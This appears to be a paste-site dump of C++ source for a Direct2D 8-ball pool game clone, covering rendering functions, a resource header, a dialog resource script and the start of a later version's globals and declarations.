        // Ensure render target is valid before proceeding
        if (!pRT) return;

        HRESULT hr = pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black, 0.8f), &pBgBrush); // Semi-transparent black
        if (FAILED(hr)) { SafeRelease(&pBgBrush); return; } // Exit if brush creation fails

        hr = pRT->CreateSolidColorBrush(D2D1::ColorF(0, 0, 0), &pBallBrush); // Placeholder, color will be set per ball
        if (FAILED(hr)) {
            SafeRelease(&pBgBrush);
            SafeRelease(&pBallBrush);
            return; // Exit if brush creation fails
        }

        // Draw the background bar (rounded rect)
        D2D1_ROUNDED_RECT roundedRect = D2D1::RoundedRect(pocketedBallsBarRect, 10.0f, 10.0f); // Corner radius 10
        float baseAlpha = 0.8f;
        float flashBoost = pocketFlashTimer * 0.5f; // Make flash effect boost alpha slightly
        float finalAlpha = std::min(1.0f, baseAlpha + flashBoost);
        pBgBrush->SetOpacity(finalAlpha);
        pRT->FillRoundedRectangle(&roundedRect, pBgBrush);
        pBgBrush->SetOpacity(1.0f); // Reset opacity after drawing

        // --- Draw small circles for pocketed balls inside the bar ---

        // Calculate dimensions based on the bar's height for better scaling
        float barHeight = pocketedBallsBarRect.bottom - pocketedBallsBarRect.top;
        float ballDisplayRadius = barHeight * 0.30f; // Make balls slightly smaller relative to bar height
        float spacing = ballDisplayRadius * 2.2f; // Adjust spacing slightly
        float padding = spacing * 0.75f; // Add padding from the edges
        float center_Y = pocketedBallsBarRect.top + barHeight / 2.0f; // Vertical center

        // Starting X positions with padding
        float currentX_P1 = pocketedBallsBarRect.left + padding;
        float currentX_P2 = pocketedBallsBarRect.right - padding; // Start from right edge minus padding

        int p1DrawnCount = 0;
        int p2DrawnCount = 0;
        const int maxBallsToShow = 7; // Max balls per player in the bar

        for (const auto& b : balls) {
            if (b.isPocketed) {
                // Skip cue ball and 8-ball in this indicator
                if (b.id == 0 || b.id == 8) continue;

                bool isPlayer1Ball = (player1Info.assignedType != BallType::NONE && b.type == player1Info.assignedType);
                bool isPlayer2Ball = (player2Info.assignedType != BallType::NONE && b.type == player2Info.assignedType);

                if (isPlayer1Ball && p1DrawnCount < maxBallsToShow) {
                    pBallBrush->SetColor(b.color);
                    // Draw P1 balls from left to right
                    D2D1_ELLIPSE ballEllipse = D2D1::Ellipse(D2D1::Point2F(currentX_P1 + p1DrawnCount * spacing, center_Y), ballDisplayRadius, ballDisplayRadius);
                    pRT->FillEllipse(&ballEllipse, pBallBrush);
                    p1DrawnCount++;
                }
                else if (isPlayer2Ball && p2DrawnCount < maxBallsToShow) {
                    pBallBrush->SetColor(b.color);
                    // Draw P2 balls from right to left
                    D2D1_ELLIPSE ballEllipse = D2D1::Ellipse(D2D1::Point2F(currentX_P2 - p2DrawnCount * spacing, center_Y), ballDisplayRadius, ballDisplayRadius);
                    pRT->FillEllipse(&ballEllipse, pBallBrush);
                    p2DrawnCount++;
                }
                // Note: Balls pocketed before assignment or opponent balls are intentionally not shown here.
                // You could add logic here to display them differently if needed (e.g., smaller, grayed out).
            }
        }

        SafeRelease(&pBgBrush);
        SafeRelease(&pBallBrush);
    }

    void DrawBallInHandIndicator(ID2D1RenderTarget* pRT) {
        if (!isDraggingCueBall && (currentGameState != BALL_IN_HAND_P1 && currentGameState != BALL_IN_HAND_P2 && currentGameState != PRE_BREAK_PLACEMENT)) {
            return; // Only show when placing/dragging
        }

        Ball* cueBall = GetCueBall();
        if (!cueBall) return;

        ID2D1SolidColorBrush* pGhostBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.6f), &pGhostBrush); // Semi-transparent white

        if (pGhostBrush) {
            D2D1_POINT_2F drawPos;
            if (isDraggingCueBall) {
                drawPos = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
            }
            else {
                // If not dragging but in placement state, show at current ball pos
                drawPos = D2D1::Point2F(cueBall->x, cueBall->y);
            }

            // Check if the placement is valid before drawing differently?
            bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
            bool isValid = IsValidCueBallPosition(drawPos.x, drawPos.y, behindHeadstring);

            if (!isValid) {
                // Maybe draw red outline if invalid placement?
                pGhostBrush->SetColor(D2D1::ColorF(D2D1::ColorF::Red, 0.6f));
            }


            D2D1_ELLIPSE ghostEllipse = D2D1::Ellipse(drawPos, BALL_RADIUS, BALL_RADIUS);
            pRT->FillEllipse(&ghostEllipse, pGhostBrush);
            pRT->DrawEllipse(&ghostEllipse, pGhostBrush, 1.0f); // Outline

            SafeRelease(&pGhostBrush);
        }
    }

    void DrawPocketSelectionIndicator(ID2D1RenderTarget* pRT) {
        /*  Never show the arrow while the player is still placing the
        cue-ball (ball-in-hand) – it otherwise hides behind the
        ghost-ball and can lock the UI.                               */

        /* Still skip the opening-break placement,
       but show the arrow during BALL-IN-HAND */
       // ? skip when no active call for the CURRENT shooter
        if ((currentPlayer == 1 && calledPocketP1 < 0) ||
            (currentPlayer == 2 && calledPocketP2 < 0))    return;
        /*if (currentGameState == PRE_BREAK_PLACEMENT)
            return;*/ //new ai-asked-to-disable
            /*if (currentGameState == BALL_IN_HAND_P1 ||
                currentGameState == BALL_IN_HAND_P2 ||
                currentGameState == PRE_BREAK_PLACEMENT)
            {
                return;
            }*/

        int pocketToIndicate = -1;
        // Whenever EITHER player has pocketed their first 7 and has called (human or AI),
        // we forcibly show their arrow—regardless of currentGameState.
        if ((currentPlayer == 1 && player1Info.ballsPocketedCount >= 7 && calledPocketP1 >= 0) ||
            (currentPlayer == 2 && player2Info.ballsPocketedCount >= 7 && calledPocketP2 >= 0))
        {
            pocketToIndicate = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        }
        /*// A human player is actively choosing if they are in the CHOOSING_POCKET state.
        bool isHumanChoosing = (currentGameState == CHOOSING_POCKET_P1 || (currentGameState == CHOOSING_POCKET_P2 && !isPlayer2AI));

        if (isHumanChoosing) {
            // When choosing, show the currently selected pocket (which has a default).
            pocketToIndicate = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        }
        else if (IsPlayerOnEightBall(currentPlayer)) {
            // If it's a normal turn but the player is on the 8-ball, show their called pocket as a reminder.
            pocketToIndicate = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
        }*/

        if (pocketToIndicate < 0 || pocketToIndicate > 5) {
            return; // Don't draw if no pocket is selected or relevant.
        }

        ID2D1SolidColorBrush* pArrowBrush = nullptr;
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Yellow, 0.9f), &pArrowBrush);
        if (!pArrowBrush) return;

        // ... The rest of your arrow drawing geometry logic remains exactly the same ...
        // (No changes needed to the points/path drawing, only the logic above)
        D2D1_POINT_2F targetPocketCenter = pocketPositions[pocketToIndicate];
        float arrowHeadSize = HOLE_VISUAL_RADIUS * 0.5f;
        float arrowShaftLength = HOLE_VISUAL_RADIUS * 0.3f;
        float arrowShaftWidth = arrowHeadSize * 0.4f;
        float verticalOffsetFromPocketCenter = HOLE_VISUAL_RADIUS * 1.6f;
        D2D1_POINT_2F tip, baseLeft, baseRight, shaftTopLeft, shaftTopRight, shaftBottomLeft, shaftBottomRight;

        if (targetPocketCenter.y == TABLE_TOP) {
            tip = D2D1::Point2F(targetPocketCenter.x, targetPocketCenter.y + verticalOffsetFromPocketCenter + arrowHeadSize);
            baseLeft = D2D1::Point2F(targetPocketCenter.x - arrowHeadSize / 2.0f, targetPocketCenter.y + verticalOffsetFromPocketCenter);
            baseRight = D2D1::Point2F(targetPocketCenter.x + arrowHeadSize / 2.0f, targetPocketCenter.y + verticalOffsetFromPocketCenter);
            shaftTopLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y);
            shaftTopRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y);
            shaftBottomLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y - arrowShaftLength);
            shaftBottomRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y - arrowShaftLength);
        }
        else {
            tip = D2D1::Point2F(targetPocketCenter.x, targetPocketCenter.y - verticalOffsetFromPocketCenter - arrowHeadSize);
            baseLeft = D2D1::Point2F(targetPocketCenter.x - arrowHeadSize / 2.0f, targetPocketCenter.y - verticalOffsetFromPocketCenter);
            baseRight = D2D1::Point2F(targetPocketCenter.x + arrowHeadSize / 2.0f, targetPocketCenter.y - verticalOffsetFromPocketCenter);
            shaftTopLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y + arrowShaftLength);
            shaftTopRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y + arrowShaftLength);
            shaftBottomLeft = D2D1::Point2F(targetPocketCenter.x - arrowShaftWidth / 2.0f, baseLeft.y);
            shaftBottomRight = D2D1::Point2F(targetPocketCenter.x + arrowShaftWidth / 2.0f, baseRight.y);
        }

        ID2D1PathGeometry* pPath = nullptr;
        if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
            ID2D1GeometrySink* pSink = nullptr;
            if (SUCCEEDED(pPath->Open(&pSink))) {
                pSink->BeginFigure(tip, D2D1_FIGURE_BEGIN_FILLED);
                pSink->AddLine(baseLeft); pSink->AddLine(shaftBottomLeft); pSink->AddLine(shaftTopLeft);
                pSink->AddLine(shaftTopRight); pSink->AddLine(shaftBottomRight); pSink->AddLine(baseRight);
                pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                pSink->Close();
                SafeRelease(&pSink);
                pRT->FillGeometry(pPath, pArrowBrush);
            }
            SafeRelease(&pPath);
        }
        SafeRelease(&pArrowBrush);
    }
```
 
==++ Here's the full source for (file 2/3 (No OOP-based)) ""resource.h""::: ++==
```resource.h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by Yahoo-8Ball-Pool-Clone.rc
//
#define IDI_ICON1                       101
// --- NEW Resource IDs (Define these in your .rc file / resource.h) ---
#define IDD_NEWGAMEDLG 106
#define IDC_RADIO_2P   1003
#define IDC_RADIO_CPU  1005
#define IDC_GROUP_AI   1006
#define IDC_RADIO_EASY 1007
#define IDC_RADIO_MEDIUM 1008
#define IDC_RADIO_HARD 1009
// --- NEW Resource IDs for Opening Break ---
#define IDC_GROUP_BREAK_MODE 1010
#define IDC_RADIO_CPU_BREAK  1011
#define IDC_RADIO_P1_BREAK   1012
#define IDC_RADIO_FLIP_BREAK 1013
// Standard IDOK is usually defined, otherwise define it (e.g., #define IDOK 1)
 
// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40002 // Incremented
#define _APS_NEXT_CONTROL_VALUE         1014 // Incremented
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif
 
```
 
==++ Here's the full source for (file 3/3 (No OOP-based)) ""Yahoo-8Ball-Pool-Clone.rc""::: ++==
```Yahoo-8Ball-Pool-Clone.rc
// Microsoft Visual C++ generated resource script.
//
#include ""resource.h""
 
#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include ""winres.h""
 
/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS
 
/////////////////////////////////////////////////////////////////////////////
// English (United States) resources
 
#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US
#pragma code_page(1252)
 
#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//
 
1 TEXTINCLUDE 
BEGIN
    ""resource.h\0""
END
 
2 TEXTINCLUDE 
BEGIN
    ""#include """"winres.h""""\r\n""
    ""\0""
END
 
3 TEXTINCLUDE 
BEGIN
    ""\r\n""
    ""\0""
END
 
#endif    // APSTUDIO_INVOKED
 
 
/////////////////////////////////////////////////////////////////////////////
//
// Icon
//
 
// Icon with lowest ID value placed first to ensure application icon
// remains consistent on all systems.
IDI_ICON1               ICON                    ""D:\\Download\\cpp-projekt\\FuzenOp_SiloTest\\icons\\shell32_277.ico""
 
#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////
 
 
 
#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//
 
 
/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED
 
#include <windows.h> // Needed for control styles like WS_GROUP, BS_AUTORADIOBUTTON etc.
 
/////////////////////////////////////////////////////////////////////////////
//
// Dialog
//
 
IDD_NEWGAMEDLG DIALOGEX 0, 0, 220, 185 // Dialog position (x, y) and size (width, height) in Dialog Units (DLUs) - Increased Height
STYLE DS_SETFONT | DS_MODALFRAME | DS_FIXEDSYS | WS_POPUP | WS_CAPTION | WS_SYSMENU
CAPTION ""New 8-Ball Game""
FONT 8, ""MS Shell Dlg"", 400, 0, 0x1 // Standard dialog font
BEGIN
// --- Game Mode Selection ---
// Group Box for Game Mode (Optional visually, but helps structure)
GROUPBOX        ""Game Mode"", IDC_STATIC, 7, 7, 90, 50
 
// ""2 Player"" Radio Button (First in this group)
CONTROL         ""&2 Player (Human vs Human)"", IDC_RADIO_2P, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 14, 20, 80, 10
 
// ""Human vs CPU"" Radio Button
CONTROL         ""Human vs &CPU"", IDC_RADIO_CPU, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 14, 35, 70, 10
 
 
// --- AI Difficulty Selection (Inside its own Group Box) ---
GROUPBOX        ""AI Difficulty"", IDC_GROUP_AI, 118, 7, 95, 70
 
// ""Easy"" Radio Button (First in the AI group)
CONTROL         ""&Easy"", IDC_RADIO_EASY, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 125, 20, 60, 10
 
// ""Medium"" Radio Button
CONTROL         ""&Medium"", IDC_RADIO_MEDIUM, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 35, 60, 10
 
// ""Hard"" Radio Button
CONTROL         ""&Hard"", IDC_RADIO_HARD, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 50, 60, 10
 
// --- Opening Break Modes (For Versus CPU Only) ---
GROUPBOX        ""Opening Break Modes:"", IDC_GROUP_BREAK_MODE, 118, 82, 95, 60
 
// ""CPU Break"" Radio Button (Default for this group)
CONTROL         ""&CPU Break"", IDC_RADIO_CPU_BREAK, ""Button"",
BS_AUTORADIOBUTTON | WS_GROUP | WS_TABSTOP, 125, 95, 70, 10
 
// ""P1 Break"" Radio Button
CONTROL         ""&P1 Break"", IDC_RADIO_P1_BREAK, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 110, 70, 10
 
// ""FlipCoin Break"" Radio Button
CONTROL         ""&FlipCoin Break"", IDC_RADIO_FLIP_BREAK, ""Button"",
BS_AUTORADIOBUTTON | WS_TABSTOP, 125, 125, 70, 10
 
 
// --- Standard Buttons ---
DEFPUSHBUTTON   ""Start"", IDOK, 55, 160, 50, 14 // Default button (Enter key) - Adjusted Y position
PUSHBUTTON      ""Cancel"", IDCANCEL, 115, 160, 50, 14 // Adjusted Y position
END
 
```"
AAZTkTUB,2D StickPool Game C++ (Midnight Pool 4 'BLISS Engine' O3 AI Visual Tweaks For AimingAids+DrawBalls3D,alien_fx_fiend,C++,Friday 11th of July 2025 12:36:28 PM CDT,"==++ Here's the full source code for (File 1\3) of ""Pool-Game-CloneV18""::: ++==
```""Pool-Game-CloneV18.cpp""
    #define WIN32_LEAN_AND_MEAN
    #define NOMINMAX
    #include <windows.h>
    #include <d2d1.h>
    #include <dwrite.h>
    #include <fstream> // For file I/O
    #include <iostream> // For some basic I/O, though not strictly necessary for just file ops
    #include <vector>
    #include <cmath>
    #include <string>
    #include <sstream> // Required for wostringstream
    #include <algorithm> // Required for std::max, std::min
    #include <ctime>    // Required for srand, time
    #include <cstdlib> // Required for srand, rand (often included by others, but good practice)
    #include <commctrl.h> // Needed for radio buttons etc. in dialog (if using native controls)
    #include <mmsystem.h> // For PlaySound
    #include <tchar.h> //midi func
    #include <thread>
    #include <atomic>
    #include ""resource.h""

    #ifndef HAS_STD_CLAMP
    template <typename T>
    T clamp(const T& v, const T& lo, const T& hi)
    {
        return (v < lo) ? lo : (v > hi) ? hi : v;
    }
    namespace std { using ::clamp; }   // inject into std:: for seamless use
    #define HAS_STD_CLAMP
    #endif

    #pragma comment(lib, ""Comctl32.lib"") // Link against common controls library
    #pragma comment(lib, ""d2d1.lib"")
    #pragma comment(lib, ""dwrite.lib"")
    #pragma comment(lib, ""Winmm.lib"") // Link against Windows Multimedia library

    // --- Constants ---
    const float PI = 3.1415926535f;
    const float BALL_RADIUS = 10.0f;
    const float TABLE_LEFT = 100.0f;
    const float TABLE_TOP = 100.0f;
    const float TABLE_WIDTH = 700.0f;
    const float TABLE_HEIGHT = 350.0f;
    const float TABLE_RIGHT = TABLE_LEFT + TABLE_WIDTH;
    const float TABLE_BOTTOM = TABLE_TOP + TABLE_HEIGHT;
    const float CUSHION_THICKNESS = 20.0f;
    const float HOLE_VISUAL_RADIUS = 22.0f; // Visual size of the hole
    const float POCKET_RADIUS = HOLE_VISUAL_RADIUS * 1.05f; // Make detection radius slightly larger // Make detection radius match visual size (or slightly larger)
    const float MAX_SHOT_POWER = 15.0f;
    const float FRICTION = 0.985f; // Friction factor per frame
    const float MIN_VELOCITY_SQ = 0.01f * 0.01f; // Stop balls below this squared velocity
    const float HEADSTRING_X = TABLE_LEFT + TABLE_WIDTH * 0.30f; // 30% line
    const float RACK_POS_X = TABLE_LEFT + TABLE_WIDTH * 0.65f; // 65% line for rack apex
    const float RACK_POS_Y = TABLE_TOP + TABLE_HEIGHT / 2.0f;
    const UINT ID_TIMER = 1;
    const int TARGET_FPS = 60; // Target frames per second for timer

    // --- Enums ---
    // --- MODIFIED/NEW Enums ---
    enum GameState {
        SHOWING_DIALOG,     // NEW: Game is waiting for initial dialog input
        PRE_BREAK_PLACEMENT,// Player placing cue ball for break
        BREAKING,           // Player is aiming/shooting the break shot
        CHOOSING_POCKET_P1, // NEW: Player 1 needs to call a pocket for the 8-ball
        CHOOSING_POCKET_P2, // NEW: Player 2 needs to call a pocket for the 8-ball
        AIMING,             // Player is aiming
        AI_THINKING,        // NEW: AI is calculating its move
        SHOT_IN_PROGRESS,   // Balls are moving
        ASSIGNING_BALLS,    // Turn after break where ball types are assigned
        PLAYER1_TURN,
        PLAYER2_TURN,
        BALL_IN_HAND_P1,
        BALL_IN_HAND_P2,
        GAME_OVER
    };

    enum BallType {
        NONE,
        SOLID,  // Yellow (1-7)
        STRIPE, // Red (9-15)
        EIGHT_BALL, // Black (8)
        CUE_BALL // White (0)
    };

    // NEW Enums for Game Mode and AI Difficulty
    enum GameMode {
        HUMAN_VS_HUMAN,
        HUMAN_VS_AI
    };

    enum AIDifficulty {
        EASY,
        MEDIUM,
        HARD
    };

    enum OpeningBreakMode {
        CPU_BREAK,
        P1_BREAK,
        FLIP_COIN_BREAK
    };

    // --- Structs ---
    struct Ball {
        int id;             // 0=Cue, 1-7=Solid, 8=Eight, 9-15=Stripe
        BallType type;
        float x, y;
        float vx, vy;
        D2D1_COLOR_F color;
        bool isPocketed;
    };

    struct PlayerInfo {
        BallType assignedType;
        int ballsPocketedCount;
        std::wstring name;
    };

    // --- Global Variables ---

    // Direct2D & DirectWrite
    ID2D1Factory* pFactory = nullptr;
    //ID2D1Factory* g_pD2DFactory = nullptr;
    ID2D1HwndRenderTarget* pRenderTarget = nullptr;
    IDWriteFactory* pDWriteFactory = nullptr;
    IDWriteTextFormat* pTextFormat = nullptr;
    IDWriteTextFormat* pLargeTextFormat = nullptr; // For ""Foul!""

    // Game State
    HWND hwndMain = nullptr;
    GameState currentGameState = SHOWING_DIALOG; // Start by showing dialog
    std::vector<Ball> balls;
    int currentPlayer = 1; // 1 or 2
    PlayerInfo player1Info = { BallType::NONE, 0, L""Vince Woods""/*""Player 1""*/ };
    PlayerInfo player2Info = { BallType::NONE, 0, L""Virtus Pro""/*""CPU""*/ }; // Default P2 name
    bool foulCommitted = false;
    std::wstring gameOverMessage = L"""";
    bool firstBallPocketedAfterBreak = false;
    std::vector<int> pocketedThisTurn;
    // --- NEW: 8-Ball Pocket Call Globals ---
    int calledPocketP1 = -1; // Pocket index (0-5) called by Player 1 for the 8-ball. -1 means not called.
    int calledPocketP2 = -1; // Pocket index (0-5) called by Player 2 for the 8-ball.
    int currentlyHoveredPocket = -1; // For visual feedback on which pocket is being hovered
    std::wstring pocketCallMessage = L""""; // Message like ""Choose a pocket...""
         // --- NEW: Remember which pocket the 8?ball actually went into last shot
    int lastEightBallPocketIndex = -1;
    //int lastPocketedIndex = -1; // pocket index (0–5) of the last ball pocketed
    int called = -1;
    bool cueBallPocketed = false;

    // --- NEW: Foul Tracking Globals ---
    int firstHitBallIdThisShot = -1;      // ID of the first object ball hit by cue ball (-1 if none)
    bool cueHitObjectBallThisShot = false; // Did cue ball hit an object ball this shot?
    bool railHitAfterContact = false;     // Did any ball hit a rail AFTER cue hit an object ball?
    // --- End New Foul Tracking Globals ---

    // NEW Game Mode/AI Globals
    GameMode gameMode = HUMAN_VS_HUMAN; // Default mode
    AIDifficulty aiDifficulty = MEDIUM; // Default difficulty
    OpeningBreakMode openingBreakMode = CPU_BREAK; // Default opening break mode
    bool isPlayer2AI = false;           // Is Player 2 controlled by AI?
    bool aiTurnPending = false;         // Flag: AI needs to take its turn when possible
    // bool aiIsThinking = false;       // Replaced by AI_THINKING game state
    // NEW: Flag to indicate if the current shot is the opening break of the game
    bool isOpeningBreakShot = false;

    // NEW: For AI shot planning and visualization
    struct AIPlannedShot {
        float angle;
        float power;
        float spinX;
        float spinY;
        bool isValid; // Is there a valid shot planned?
    };
    AIPlannedShot aiPlannedShotDetails; // Stores the AI's next shot
    bool aiIsDisplayingAim = false;    // True when AI has decided a shot and is in ""display aim"" mode
    int aiAimDisplayFramesLeft = 0;  // How many frames left to display AI aim
    const int AI_AIM_DISPLAY_DURATION_FRAMES = 45; // Approx 0.75 seconds at 60 FPS, adjust as needed

    // Input & Aiming
    POINT ptMouse = { 0, 0 };
    bool isAiming = false;
    bool isDraggingCueBall = false;
    // --- ENSURE THIS LINE EXISTS HERE ---
    bool isDraggingStick = false; // True specifically when drag initiated on the stick graphic
    // --- End Ensure ---
    bool isSettingEnglish = false;
    D2D1_POINT_2F aimStartPoint = { 0, 0 };
    float cueAngle = 0.0f;
    float shotPower = 0.0f;
    // --- visual-only copies, used purely for drawing -------------
    float visualCueAngle = 0.0f;     // what we SHOW on screen
    float visualShotPower = 0.0f;     // ditto
    const float AIM_SMOOTH_FACTOR = 0.18f;   // 0.1–0.25 feels good
    float cueSpinX = 0.0f; // Range -1 to 1
    float cueSpinY = 0.0f; // Range -1 to 1
    float pocketFlashTimer = 0.0f;
    bool cheatModeEnabled = false; // Cheat Mode toggle (G key)
    int draggingBallId = -1;
    bool keyboardAimingActive = false; // NEW FLAG: true when arrow keys modify aim/power
    MCIDEVICEID midiDeviceID = 0; //midi func
    std::atomic<bool> isMusicPlaying(false); //midi func
    std::thread musicThread; //midi func
    void StartMidi(HWND hwnd, const TCHAR* midiPath);
    void StopMidi();

    // UI Element Positions
    D2D1_RECT_F powerMeterRect = { TABLE_RIGHT + CUSHION_THICKNESS + 10, TABLE_TOP, TABLE_RIGHT + CUSHION_THICKNESS + 40, TABLE_BOTTOM };
    D2D1_RECT_F spinIndicatorRect = { TABLE_LEFT - CUSHION_THICKNESS - 60, TABLE_TOP + 20, TABLE_LEFT - CUSHION_THICKNESS - 20, TABLE_TOP + 60 }; // Circle area
    D2D1_POINT_2F spinIndicatorCenter = { spinIndicatorRect.left + (spinIndicatorRect.right - spinIndicatorRect.left) / 2.0f, spinIndicatorRect.top + (spinIndicatorRect.bottom - spinIndicatorRect.top) / 2.0f };
    float spinIndicatorRadius = (spinIndicatorRect.right - spinIndicatorRect.left) / 2.0f;
    D2D1_RECT_F pocketedBallsBarRect = { TABLE_LEFT, TABLE_BOTTOM + CUSHION_THICKNESS + 30, TABLE_RIGHT, TABLE_BOTTOM + CUSHION_THICKNESS + 70 };

    // Corrected Pocket Center Positions (aligned with table corners/edges)
    const D2D1_POINT_2F pocketPositions[6] = {
        {TABLE_LEFT, TABLE_TOP},                           // Top-Left
        {TABLE_LEFT + TABLE_WIDTH / 2.0f, TABLE_TOP},      // Top-Middle
        {TABLE_RIGHT, TABLE_TOP},                          // Top-Right
        {TABLE_LEFT, TABLE_BOTTOM},                        // Bottom-Left
        {TABLE_LEFT + TABLE_WIDTH / 2.0f, TABLE_BOTTOM},   // Bottom-Middle
        {TABLE_RIGHT, TABLE_BOTTOM}                        // Bottom-Right
    };

    // Colors
    const D2D1_COLOR_F TABLE_COLOR = D2D1::ColorF(0.1608f, 0.4000f, 0.1765f); // Darker Green NEWCOLOR (0.0f, 0.5f, 0.1f) => (0.1608f, 0.4000f, 0.1765f)
    //const D2D1_COLOR_F TABLE_COLOR = D2D1::ColorF(0.0f, 0.5f, 0.1f); // Darker Green NEWCOLOR (0.0f, 0.5f, 0.1f) => (0.1608f, 0.4000f, 0.1765f)
    const D2D1_COLOR_F CUSHION_COLOR = D2D1::ColorF(D2D1::ColorF(0.3608f, 0.0275f, 0.0078f)); // NEWCOLOR ::Red => (0.3608f, 0.0275f, 0.0078f)
    //const D2D1_COLOR_F CUSHION_COLOR = D2D1::ColorF(D2D1::ColorF::Red); // NEWCOLOR ::Red => (0.3608f, 0.0275f, 0.0078f)
    const D2D1_COLOR_F POCKET_COLOR = D2D1::ColorF(D2D1::ColorF::Black);
    const D2D1_COLOR_F CUE_BALL_COLOR = D2D1::ColorF(D2D1::ColorF::White);
    const D2D1_COLOR_F EIGHT_BALL_COLOR = D2D1::ColorF(D2D1::ColorF::Black);
    const D2D1_COLOR_F SOLID_COLOR = D2D1::ColorF(D2D1::ColorF::Goldenrod); // Solids = Yellow Goldenrod
    const D2D1_COLOR_F STRIPE_COLOR = D2D1::ColorF(D2D1::ColorF::DarkOrchid);   // Stripes = Red DarkOrchid
    const D2D1_COLOR_F AIM_LINE_COLOR = D2D1::ColorF(D2D1::ColorF::White, 0.7f); // Semi-transparent white
    const D2D1_COLOR_F FOUL_TEXT_COLOR = D2D1::ColorF(D2D1::ColorF::Red);
    const D2D1_COLOR_F TURN_ARROW_COLOR = D2D1::ColorF(0.1333f, 0.7294f, 0.7490f); //NEWCOLOR 0.1333f, 0.7294f, 0.7490f => ::Blue
    //const D2D1_COLOR_F TURN_ARROW_COLOR = D2D1::ColorF(D2D1::ColorF::Blue);
    const D2D1_COLOR_F ENGLISH_DOT_COLOR = D2D1::ColorF(D2D1::ColorF::Red);
    const D2D1_COLOR_F UI_TEXT_COLOR = D2D1::ColorF(D2D1::ColorF::Black);

    // --- Forward Declarations ---
    HRESULT CreateDeviceResources();
    void DiscardDeviceResources();
    void OnPaint();
    void OnResize(UINT width, UINT height);
    void InitGame();
    void GameUpdate();
    void UpdatePhysics();
    void CheckCollisions();
    bool CheckPockets(); // Returns true if any ball was pocketed
    void ProcessShotResults();
    void ApplyShot(float power, float angle, float spinX, float spinY);
    void RespawnCueBall(bool behindHeadstring);
    bool AreBallsMoving();
    void SwitchTurns();
    //bool AssignPlayerBallTypes(BallType firstPocketedType);
    bool AssignPlayerBallTypes(BallType firstPocketedType,
        bool creditShooter = true);
    void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed);
    Ball* GetBallById(int id);
    Ball* GetCueBall();
    //void PlayGameMusic(HWND hwnd); //midi func
    void AIBreakShot();

    // Drawing Functions
    void DrawScene(ID2D1RenderTarget* pRT);
    void DrawTable(ID2D1RenderTarget* pRT, ID2D1Factory* pFactory);
    void DrawBalls(ID2D1RenderTarget* pRT);
    void DrawCueStick(ID2D1RenderTarget* pRT);
    void DrawAimingAids(ID2D1RenderTarget* pRT);
    void DrawUI(ID2D1RenderTarget* pRT);
    void DrawPowerMeter(ID2D1RenderTarget* pRT);
    void DrawSpinIndicator(ID2D1RenderTarget* pRT);
    void DrawPocketedBallsIndicator(ID2D1RenderTarget* pRT);
    void DrawBallInHandIndicator(ID2D1RenderTarget* pRT);
    // NEW
    void DrawPocketSelectionIndicator(ID2D1RenderTarget* pRT);

    // Helper Functions
    float GetDistance(float x1, float y1, float x2, float y2);
    float GetDistanceSq(float x1, float y1, float x2, float y2);
    bool IsValidCueBallPosition(float x, float y, bool checkHeadstring);
    template <typename T> void SafeRelease(T** ppT);
    // --- NEW HELPER FORWARD DECLARATIONS ---
    bool IsPlayerOnEightBall(int player);
    void CheckAndTransitionToPocketChoice(int playerID);
    // --- ADD FORWARD DECLARATION FOR NEW HELPER HERE ---
    float PointToLineSegmentDistanceSq(D2D1_POINT_2F p, D2D1_POINT_2F a, D2D1_POINT_2F b);
    // --- End Forward Declaration ---
    bool LineSegmentIntersection(D2D1_POINT_2F p1, D2D1_POINT_2F p2, D2D1_POINT_2F p3, D2D1_POINT_2F p4, D2D1_POINT_2F& intersection); // Keep this if present

    // --- NEW Forward Declarations ---

    // AI Related
    struct AIShotInfo; // Define below
    void TriggerAIMove();
    void AIMakeDecision();
    void AIPlaceCueBall();
    AIShotInfo AIFindBestShot();
    AIShotInfo EvaluateShot(Ball* targetBall, int pocketIndex);
